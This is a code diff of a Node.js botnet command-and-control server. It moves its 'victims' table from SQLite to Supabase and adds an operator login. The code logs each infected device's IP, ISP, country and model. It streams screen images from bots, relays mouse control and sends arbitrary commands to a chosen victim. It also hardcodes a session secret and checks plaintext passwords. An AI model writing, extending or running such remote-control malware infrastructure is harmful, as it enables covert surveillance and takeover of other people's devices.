@@ -3,85 +3,110 @@ import path from 'path'
 import { Server } from "socket.io";
 import bodyParser from 'body-parser';
 import cors from 'cors'
-import sqlite3 from "sqlite3";
 import chalk from "chalk";
+import { superBase } from "./superBaseAPI.js";
+import session from "express-session";
+import FileStore  from "session-file-store";
 
+// Clearing the database
+superBase.from("victims")
+    .delete()
+    .like("ID","%")
 
 
 
 // Variables
+const File_Store = FileStore(session)
 const portB = 4000
 const portM = 4001
 const ipB = "0.0.0.0"
-const ipM = "127.0.0.1"
-let adminSoc=null;
+const ipM = "0.0.0.0"
+let adminSoc = null;
+let victim = null
 // Variables
-
-
-
-// DATABASE
-let db = new sqlite3.Database('./database/devicesDB', (err) => {
-    if (err) {
-      return console.error(err.message);
-    }
-    console.log(chalk.cyan('\nConnected to the in-memory SQlite database'));
-    console.log(chalk.grey('=====================[logs]=====================\n'));
-  });
-
-// RESETING DB
-db.get(`delete from victim`,[],(err)=>{
-    if (err) {
-        return console.error(err.message);
-    }
-})
-
-  // close the database connection
-//   db.close((err) => {
-//     if (err) {
-//       return console.error(err.message);
-//     }
-//     console.log('Close the database connection.');
-//   });
-
 
 
 // Express
 const app = express()
+app.use(session({
+    store: new File_Store(),
+    secret: "keyboard cat",
+    resave: false,
+    cookie: { maxAge: 1000 * 60 * 60 * 24 },
+    saveUninitialized: true
+}))
 app.use(bodyParser.urlencoded({ extended: false }))
 app.use(express.static('static'))
 app.use(cors())
-
+app.use('/', (req,res,next)=>{
+    console.log(req.path)
+    if(req.path == "/login"){
+        next() 
+    }else{
+        if(!req.session.name){
+            console.log("name plz ",req.session.name)
+            res.redirect("/login")
+        }else{
+            next()
+        }
+    }
+})
 app.get("/dashboard",(req,res)=>{
     res.sendFile(path.resolve("./static/html/index.html"))
 })
 
-app.post("/info",(req,res)=>{
-    db.get(`select * from victim where id = ?`,[req.body.id],(err,row)=>{
-        if (err) {
-            return console.error(err.message);
-        }
-        // console.log("Deleted")
-        res.json(row)
-    })
+app.get("/login",(req,res)=>{
+    res.sendFile(path.resolve("./static/html/login.html"))
 })
 
-app.post("/send",(req,res)=>{
+app.post("/login",async (req,res)=>{
+    var username = req.body.username
+    var password = req.body.password
+
+    var {data:data,error:err} = await superBase.from("activeuser")
+        .select("name")
+        .eq("username",username)
+        .eq("password",password)
+    if (!(err || data.length == 0)){
+        req.session.name = data[0].name
+        res.send("ok")
+    }else{
+        res.send("error")
+    }
+})
+
+app.post("/info",async (req,res)=>{
+    var {data:data,error:err} = await superBase.from("victims").select("*").eq("ID",req.body.id)
+    if(!(err || data.length == 0)){
+        res.json(data[0])
+        victim = botIo.sockets.sockets.get(req.body.id)
+    }
+})
+
+app.post("/send",async(req,res)=>{
     if(req.body.emit == "" || req.body.id == ""){
         res.status(400).send()
         return
     }
 
     if(req.body.emit == "ping"){
-        ids.forEach(id=>{
-            botIo.sockets.sockets.get(id).emit("ping",req.body.args)
-        })
+        botIo.emit("ping",req.body.args)
+        // ids.forEach(id=>{
+        //     botIo.sockets.sockets.get(id).emit("ping",req.body.args)
+        // })
     }else{
-        botIo.sockets.sockets.get(req.body.id).emit(req.body.emit,req.body.args)
-        console.log(req.body.id,req.body.emit,req.body.args)
+        try {
+            victim.emit(req.body.emit,req.body.args)
+        } catch (error) {
+            await superBase.from("victims")
+            .delete()
+            .eq("ID",victim.id)
+            getRemaining()
+            victim = null
+        }
     }
     res.status(200).send("Good")
 })
-
 
 
 const botnet = express().listen(portB,ipB, () => {
@@ -95,23 +120,33 @@ const masterServer = app.listen(portM,ipM, () => {
 
 // Socket io Connection for BOTS
 const botIo = new Server(botnet);
-botIo.on("connection",(socket)=>{
+botIo.on("connection",async (socket)=>{
+    // Clearing the database
+    superBase.from("victims")
+        .delete()
+        .like("ID","%")
+
+
     var data = JSON.parse(socket.handshake.query.info)
-    db.get(`insert into victim(ID,Country,ISP,IP,Brand,Model,Manufacture) values(?,?,?,?,?,?,?)`,[socket.id,data.Country,data.ISP,data.IP,data.Brand,data.Model,data.Manufacture],(err)=>{
-        if (err) {
-            return console.error(err.message);
-        }
-    })
+    await superBase.from("victims")
+        .insert([{
+            "ID":socket.id,
+            "Country":data.Country,
+            "ISP":data.ISP,
+            "IP":data.IP,
+            "Brand":data.Brand,
+            "Model":data.Model,
+            "Manufacture":data.Manufacture
+        }])
+    
     console.log(chalk.green(`[+] Bot Connected (${socket.id}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
     getRemaining()
 
 
-    socket.on("disconnect",()=>{
-        db.get(`delete from victim where id = ?`,[socket.id],(err)=>{
-            if (err) {
-                return console.error(err.message);
-            }
-        })
+    socket.on("disconnect",async()=>{
+        await superBase.from("victims")
+            .delete()
+            .eq("ID",socket.id)
         console.log(chalk.redBright(`[x] Bot Disconnected (${socket.id})`))
         getRemaining()
     })
@@ -127,7 +162,6 @@ botIo.on("connection",(socket)=>{
     socket.on("img",(data)=>{
         try {
             adminSoc.emit("img",data)
-            // console.log(chalk.grey("data"))
         } catch (err) {
             console.error(err)
         }
@@ -147,23 +181,54 @@ masterIo.on("connection",(socket)=>{
             console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
             adminSoc = null
         })
+
+        socket.on("mouse",(data)=>{
+            victim.emit("mouse",data)
+        })
+        
     }else{
         socket.disconnect()
     }
+
+
+    
 })
 
 
 function getRemaining() {
-    var data = []
-    db.each(`select ID,Brand,Model from victim limit 20`,[],(err,row)=>{
-        if (err) {
-            return console.error(err.message);
-        }
-        data.push([row.ID,row.Brand,row.Model])
-    },()=>{
-        if(adminSoc != null){
-            adminSoc.emit("info",data);
-        }
-    })
+    superBase.from("victims").select("ID,Brand,Model").limit(20)
+        .then(({data:data,error:err}) =>{
+            // console.log(data)
+            if (!(err || data.length == 0 || adminSoc == null)){
+                adminSoc.emit("info",data)
+            }
+        })
 }
 
+
+
+
+
+
+
+
+// async function run (params) {
+//     // await superBase.from("victims")
+//     //         .insert([{
+//     //             "ID":"socket.id",
+//     //             "Country":"data",
+//     //             "ISP":"data.ISP",
+//     //             "IP":"data.IP",
+//     //             "Brand":"data.Brand",
+//     //             "Model":"data.Model",
+//     //             "Manufacture":"data.Manufacture"
+//     //         }])
+//     await superBase.from("victims")
+//         .delete()
+//         .like("ID","%")
+
+//     var data = await superBase.from("victims").select().then(({data:d,error:err})=>{console.log(d)})
+// }
+
+
+// run()
